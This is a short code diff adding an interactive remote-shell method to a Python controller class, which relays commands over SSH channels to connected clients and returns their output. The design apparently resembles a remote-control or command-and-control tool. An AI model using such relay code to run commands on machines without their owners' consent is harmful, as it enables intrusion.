@@ -126,6 +126,30 @@ class Controller(threading.Thread):
             else:
                 contr_ssh_channel.send("Command not found")
 
+    def shell(self, contr_ssh_channel, client):
+        path = self.get_client_data(client, "getpath")
+        if path == "":
+            contr_ssh_channel.send("clientdisconnected")
+        else:
+            contr_ssh_channel.send(path)
+
+        while len(path):
+            command = contr_ssh_channel.recv(1024).decode('utf-8')
+            if command == "exit":
+                if not client.ssh_channel.closed:
+                    client.ssh_channel.send(command)
+                return
+            else:
+                out = self.get_client_data(client, command)
+                if out == "": out = "Client Disconnected"
+                contr_ssh_channel.send(out)
+
+            path = self.get_client_data(client, "getpath")
+            if path == "":
+                contr_ssh_channel.send("clientdisconnected")
+            else:
+                contr_ssh_channel.send(path)
+
     def exit_controller_session(self):
         try:
             if self.ssh_session:
